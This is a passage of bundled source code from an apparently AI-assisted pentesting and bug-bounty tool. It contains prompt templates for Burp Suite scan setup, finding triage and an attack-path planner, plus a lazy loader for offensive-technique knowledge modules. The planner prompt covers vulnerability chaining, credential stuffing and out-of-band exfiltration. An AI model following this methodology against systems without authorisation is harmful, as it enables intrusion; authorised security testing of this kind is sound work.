- "Audit checks - all" \u2014 Full audit including time-based (slow but thorough)
- "Audit checks - all except time-based detection methods" \u2014 Fast audit, good default
- "Audit checks - critical issues only" \u2014 Quick check for high-severity issues
- "Crawl strategy - fastest" \u2014 Minimal crawl for known endpoints
- "Crawl strategy - more complete" \u2014 Balanced crawl
- "Crawl strategy - most complete" \u2014 Maximum coverage crawl
- "Never stop audit due to application errors" \u2014 Resilient scanning
- "Minimize false positives" \u2014 Conservative detection`,
        userPromptTemplate: `Configure a Burp scan for this target:
Target: {{targetUrl}}
Technology: {{technology}}
Auth: {{authCredentials}}
Scope: {{scopeRules}}
Previous ZAP findings: {{zapFindings}}
Engagement phase: {{phase}}

Return a JSON scan request body optimized for this target. Consider:
1. Which scan configuration names to use
2. Scope include/exclude rules
3. Application login configuration
4. Whether to use crawl_and_audit or audit_only based on phase`,
        expectedOutput: "JSON scan request body for Burp REST API POST /v0.1/scan"
      },
      {
        id: "burp-finding-triage",
        phase: "triage",
        name: "Burp Finding Triage and Correlation",
        systemPrompt: `You are an expert bug bounty hunter triaging Burp Suite findings. Your role is to:
1. Classify each finding as True Positive (TP), False Positive (FP), or Needs Verification
2. Cross-reference with ZAP findings for corroboration
3. Assess exploitability and impact for bug bounty reporting
4. Prioritize findings by bounty potential

TRIAGE DECISION MATRIX:
- Burp "Certain" confidence + ZAP confirms = Definite TP \u2192 Report immediately
- Burp "Certain" confidence + ZAP no finding = Likely TP \u2192 Verify manually
- Burp "Firm" confidence + ZAP confirms = Strong TP \u2192 Report with evidence
- Burp "Firm" confidence + ZAP no finding = Needs verification \u2192 Manual test
- Burp "Tentative" confidence + ZAP confirms = Possible TP \u2192 Verify carefully
- Burp "Tentative" confidence + ZAP no finding = Likely FP \u2192 Low priority verify

CROSS-TOOL CORRELATION RULES:
- If both Burp and ZAP find the same issue \u2192 HIGH confidence, merge evidence
- If only Burp finds it (especially OOB/Collaborator) \u2192 MEDIUM confidence, Burp advantage
- If only ZAP finds it \u2192 Check if Burp was configured to test that vector
- Conflicting results \u2192 Manual verification required

BOUNTY IMPACT ASSESSMENT:
- P1 (Critical): RCE, auth bypass, full account takeover, SSRF to internal services
- P2 (High): Stored XSS, SQL injection, significant data exposure, privilege escalation
- P3 (Medium): Reflected XSS, CSRF on sensitive actions, IDOR with limited impact
- P4 (Low): Information disclosure, missing headers, minor misconfigurations`,
        userPromptTemplate: `Triage these Burp findings against ZAP results:

Burp Findings:
{{burpFindings}}

ZAP Findings (same target):
{{zapFindings}}

Target: {{targetUrl}}
Technology: {{technology}}

For each finding, provide:
1. Classification (TP/FP/Needs Verification)
2. Cross-tool correlation status
3. Bounty priority (P1-P4)
4. Recommended next steps`,
        expectedOutput: "Structured triage report with classifications and recommended actions"
      },
      {
        id: "burp-attack-path",
        phase: "exploitation",
        name: "Burp Attack Path Planner",
        systemPrompt: `You are an expert penetration tester planning attack paths using Burp Suite Professional. Your role is to chain vulnerabilities found by Burp and ZAP into exploitable attack paths.

ATTACK CHAIN METHODOLOGY:
1. Start with information disclosure findings to map internal architecture
2. Use SSRF/XXE findings to probe internal services
3. Chain authentication bypass with privilege escalation
4. Combine XSS with CSRF for account takeover
5. Use file upload + path traversal for RCE
6. Leverage Collaborator findings for OOB data exfiltration

BURP TOOLS FOR EXPLOITATION:
- Repeater: Manual request modification and replay for precise exploitation
- Intruder: Automated fuzzing for IDOR enumeration, credential stuffing
- Collaborator: OOB interaction detection for blind vulnerabilities
- Sequencer: Session token randomness analysis
- Comparer: Response comparison for timing attacks

CROSS-TOOL EXPLOITATION STRATEGY:
1. Use ZAP spider results to identify endpoints Burp didn't crawl
2. Use Burp Collaborator findings to confirm ZAP's tentative SSRF/XXE alerts
3. Use ZAP's authenticated scan results to find endpoints for Burp Intruder attacks
4. Combine ZAP's passive findings (info disclosure) with Burp's active exploitation`,
        userPromptTemplate: `Plan attack paths from these combined findings:

Burp Findings: {{burpFindings}}
ZAP Findings: {{zapFindings}}
Confirmed Credentials: {{credentials}}
Target Architecture: {{architecture}}

Generate attack chains that:
1. Start from the highest-confidence findings
2. Chain multiple vulnerabilities for maximum impact
3. Use appropriate Burp tools for each exploitation step
4. Include evidence collection steps for bug bounty reporting`,
        expectedOutput: "Ordered list of attack chains with step-by-step exploitation using Burp tools"
      }
    ];
    initBurpKnowledge().catch((e) => console.warn("[BurpKnowledge] Auto-init failed:", e.message));
  }
});

// server/lib/knowledge-lazy.ts
function clearKnowledgeCache() {
  const count = _loadedModules.size;
  _loadedModules.clear();
  return count;
}
function getKnowledgeCacheSize() {
  return _loadedModules.size;
}
function getCacheStatus() {
  return {
    cachedModules: [..._loadedModules],
    cacheSize: _loadedModules.size
  };
}
function track(key) {
  _loadedModules.add(key);
}
function getNmapScanPlanContext(...args) {
  track("scanforge");
  return getScanforgeScanPlanContext(...args);
}
function getNmapVulnCorrelationContext(...args) {
  track("scanforge");
  return getScanforgeVulnCorrelationContext(...args);
}
function getNmapHuntContext(...args) {
  track("scanforge");
  return getScanforgeHuntContext();
}
function getScanforgeScanPlanContext2(...args) {
  track("scanforge");
  return getScanforgeScanPlanContext(...args);
}
function getScanforgeVulnCorrelationContext2(...args) {
  track("scanforge");
  return getScanforgeVulnCorrelationContext();
}
function getScanforgeHuntContext2(...args) {
  track("scanforge");
  return getScanforgeHuntContext();
}
function getFullScanforgeContext2(...args) {
  track("scanforge");
  return getFullScanforgeContext(...args);
}
function buildOptimalScanforgeCommand2(...args) {
  track("scanforge");
  return buildOptimalScanforgeCommand(...args);
}
function getChainsByVulnDescriptions2(...args) {
  track("chain");
  return getChainsByVulnDescriptions(...args);
}
function formatChainsForPrompt2(...args) {
  track("chain");
  return formatChainsForPrompt(...args);
}
function inferAssetContext2(...args) {
  track("ontology");
  return inferAssetContext(...args);
}
function formatOntologyForPrompt2(...args) {
  track("ontology");
  return formatOntologyForPrompt(...args);
}
function getBugBountyContext2(...args) {
  track("bb");
  return getBugBountyContext(...args);
}
function getTriageSystemPrompt2(...args) {
  track("bb");
  return getTriageSystemPrompt(...args);
}
function getTrainingExamplesForPrompt2(...args) {
  track("bb");
  return getTrainingExamplesForPrompt(...args);
}
function getTriageCorpusContext2(...args) {
  track("corpus");
  return getTriageCorpusContext(...args);
}
function buildCloudSecurityContext2(...args) {
  track("cloud");
  return buildCloudSecurityContext(...args);
}
function buildGeneralCloudContext2(...args) {
  track("cloud");
  return buildGeneralCloudContext(...args);
}
function detectCloudProviders2(...args) {
  track("cloud");
  return detectCloudProviders(...args);
}
function getOwaspScanPlanContext2(...args) {
  track("owasp");
  return getOwaspScanPlanContext(...args);
}
function getOwaspVulnCorrelationContext2(...args) {
  track("owasp");
  return getOwaspVulnCorrelationContext(...args);
}
function getOwaspAssetClassificationContext2(...args) {
  track("owasp");
  return getOwaspAssetClassificationContext(...args);
}
function getThreatGroupScanContext2(...args) {
  track("threat");
  return getThreatGroupScanContext(...args);
}
function getThreatGroupVulnContext2(...args) {
  track("threat");
  return getThreatGroupVulnContext(...args);
}
function getSectorThreatContext2(...args) {
  track("threat");
  return getSectorThreatContext(...args);
}
function getGroupsByCVE2(...args) {
  track("threat");
  return getGroupsByCVE(...args);
}
function buildOffensiveTechniquesContext2(...args) {
  track("offensive");
  return buildOffensiveTechniquesContext(...args);
}
function getFirewallEvasionContext2(...args) {
  track("offensive");
  return getFirewallEvasionContext(...args);
}
function getFileUploadBypassContext2(...args) {
  track("offensive");
  return getFileUploadBypassContext(...args);
}
function getLOTLContext2(...args) {
  track("offensive");
  return getLOTLContext(...args);
}
function getShodanReconContext2(...args) {
  track("offensive");
  return getShodanReconContext(...args);
}
function getSubdomainEnumContext2(...args) {
  track("offensive");
  return getSubdomainEnumContext(...args);
}
function buildZAPKnowledgeContext2(...args) {
  track("zap");
  return buildZAPKnowledgeContext(...args);
}
function getZAPAlertCatalogContext2(...args) {
  track("zap");
  return getZAPAlertCatalogContext(...args);
}
function getTechScanPolicyContext2(...args) {
  track("zap");
  return getTechScanPolicyContext(...args);
}
function getZAPAuthContext2(...args) {
  track("zap");
  return getZAPAuthContext(...args);
}
function getZAPReasoningPrompt2(...args) {
  track("zap");
  return getZAPReasoningPrompt(...args);
}
function getVulnPayloadContext2(...args) {
  track("zap");
  return getVulnPayloadContext(...args);
}
function buildToolRecommendationContext2(...args) {
  track("tools");
  return buildToolRecommendationContext(...args);
}
function buildAttackPlannerToolContext2(...args) {
  track("tools");
  return buildAttackPlannerToolContext(...args);
}
function buildMethodologyContext2(...args) {
  track("methodology");
  return buildMethodologyContext(...args);
}
function buildPhaseToolContext2(...args) {
  track("methodology");
  return buildPhaseToolContext(...args);
}
function buildVulnTestingContext2(...args) {
  track("methodology");
  return buildVulnTestingContext(...args);
}
function buildScanPlanningContext2(...args) {
  track("methodology");
  return buildScanPlanningContext(...args);
}
function buildMissedVulnContext2(...args) {
  track("missed");
  return buildMissedVulnContext(...args);
}
function buildMissedVulnAttackContext2(...args) {
  track("missed");
  return buildMissedVulnAttackContext(...args);
}
async function buildThreatActorLearningContext2(...args) {
  track("threat-actor");
  return buildThreatActorLearningContext(...args);
}
function buildThreatActorVulnContext2(...args) {
  track("threat-actor");
  return buildThreatActorVulnContext(...args);
}
function scoreEngagementThreatAttribution2(...args) {
  track("threat-actor");
  return scoreEngagementThreatAttribution(...args);
}
function clearThreatLearningCache2(...args) {
  track("threat-actor");
  return clearThreatLearningCache(...args);
}
function buildSourceSecretsContext2(...args) {
  track("secrets");
  return buildSourceSecretsContext(...args);
}
function buildCompactSourceSecretsContext2(...args) {
  track("secrets");
  return buildCompactSourceSecretsContext(...args);
}
function buildBurpKnowledgeContext2(...args) {
  track("burp");
  return buildBurpKnowledgeContext(...args);
}
function getBurpScanConfigContext2(...args) {
  track("burp");
  return getBurpScanConfigContext(...args);
}
function getBurpAttackProfileContext2(...args) {
  track("burp");
  return getBurpAttackProfileContext(...args);
}
function getBurpCollaboratorContext2(...args) {
  track("burp");
  return getBurpCollaboratorContext(...args);
}
function getCrossToolCorrelationContext2(...args) {
  track("burp");
  return getCrossToolCorrelationContext(...args);
}
function getBurpReasoningPrompt2(...args) {
  track("burp");
  return getBurpReasoningPrompt(...args);
}
async function lazyFetchKevCatalog(...args) {
  track("kev");
  return fetchKevCatalog(...args);
}
function lazyMatchCvesAgainstKev(...args) {
  track("kev");
  return matchCvesAgainstKev(...args);
}
function lazyCalculateKevRiskBoost(...args) {
  track("kev");
  return calculateKevRiskBoost(...args);
}
var _loadedModules;
var init_knowledge_lazy = __esm({
  "server/lib/knowledge-lazy.ts"() {
    init_scanforge_knowledge();
    init_attack_chain_retriever();
    init_asset_ontology();
    init_bugbounty_knowledge();
    init_training_corpus();
    init_cloud_security_knowledge();
    init_owasp_knowledge();
    init_threat_group_knowledge();
    init_offensive_techniques_knowledge();
    init_zap_pentesting_knowledge();
    init_offensive_tools_knowledge();
    init_bugbounty_methodology_knowledge();
    init_missed_vuln_training_knowledge();
    init_threat_actor_learning_context();
    init_zap_source_secrets_knowledge();
    init_burp_pentesting_knowledge();
    init_kev_service();
    _loadedModules = /* @__PURE__ */ new Set();
  }
});

export {
  clearKnowledgeCache,
  getKnowledgeCacheSize,
  getCacheStatus,
  getNmapScanPlanContext,
  getNmapVulnCorrelationContext,
  getNmapHuntContext,
  getScanforgeScanPlanContext2 as getScanforgeScanPlanContext,
  getScanforgeVulnCorrelationContext2 as getScanforgeVulnCorrelationContext,
  getScanforgeHuntContext2 as getScanforgeHuntContext,
  getFullScanforgeContext2 as getFullScanforgeContext,
  buildOptimalScanforgeCommand2 as buildOptimalScanforgeCommand,
  getChainsByVulnDescriptions2 as getChainsByVulnDescriptions,
  formatChainsForPrompt2 as formatChainsForPrompt,
  inferAssetContext2 as inferAssetContext,
  formatOntologyForPrompt2 as formatOntologyForPrompt,
  getBugBountyContext2 as getBugBountyContext,
  getTriageSystemPrompt2 as getTriageSystemPrompt,
  getTrainingExamplesForPrompt2 as getTrainingExamplesForPrompt,
  getTriageCorpusContext2 as getTriageCorpusContext,
  buildCloudSecurityContext2 as buildCloudSecurityContext,
  buildGeneralCloudContext2 as buildGeneralCloudContext,
  detectCloudProviders2 as detectCloudProviders,
  getOwaspScanPlanContext2 as getOwaspScanPlanContext,
  getOwaspVulnCorrelationContext2 as getOwaspVulnCorrelationContext,
  getOwaspAssetClassificationContext2 as getOwaspAssetClassificationContext,
  getThreatGroupScanContext2 as getThreatGroupScanContext,
  getThreatGroupVulnContext2 as getThreatGroupVulnContext,
  getSectorThreatContext2 as getSectorThreatContext,
  getGroupsByCVE2 as getGroupsByCVE,
  buildOffensiveTechniquesContext2 as buildOffensiveTechniquesContext,
  getFirewallEvasionContext2 as getFirewallEvasionContext,
  getFileUploadBypassContext2 as getFileUploadBypassContext,
  getLOTLContext2 as getLOTLContext,
  getShodanReconContext2 as getShodanReconContext,
  getSubdomainEnumContext2 as getSubdomainEnumContext,
  buildZAPKnowledgeContext2 as buildZAPKnowledgeContext,
  getZAPAlertCatalogContext2 as getZAPAlertCatalogContext,
  getTechScanPolicyContext2 as getTechScanPolicyContext,
  getZAPAuthContext2 as getZAPAuthContext,
  getZAPReasoningPrompt2 as getZAPReasoningPrompt,
  getVulnPayloadContext2 as getVulnPayloadContext,
  buildToolRecommendationContext2 as buildToolRecommendationContext,
  buildAttackPlannerToolContext2 as buildAttackPlannerToolContext,
  buildMethodologyContext2 as buildMethodologyContext,
  buildPhaseToolContext2 as buildPhaseToolContext,
  buildVulnTestingContext2 as buildVulnTestingContext,
  buildScanPlanningContext2 as buildScanPlanningContext,
  buildMissedVulnContext2 as buildMissedVulnContext,
  buildMissedVulnAttackContext2 as buildMissedVulnAttackContext,
  buildThreatActorLearningContext2 as buildThreatActorLearningContext,
  buildThreatActorVulnContext2 as buildThreatActorVulnContext,
  scoreEngagementThreatAttribution2 as scoreEngagementThreatAttribution,
  clearThreatLearningCache2 as clearThreatLearningCache,
  buildSourceSecretsContext2 as buildSourceSecretsContext,
  buildCompactSourceSecretsContext2 as buildCompactSourceSecretsContext,
  buildBurpKnowledgeContext2 as buildBurpKnowledgeContext,
  getBurpScanConfigContext2 as getBurpScanConfigContext,
  getBurpAttackProfileContext2 as getBurpAttackProfileContext,
  getBurpCollaboratorContext2 as getBurpCollaboratorContext,
  getCrossToolCorrelationContext2 as getCrossToolCorrelationContext,
  getBurpReasoningPrompt2 as getBurpReasoningPrompt,
  lazyFetchKevCatalog,
  lazyMatchCvesAgainstKev,
  lazyCalculateKevRiskBoost,
  init_knowledge_lazy
};
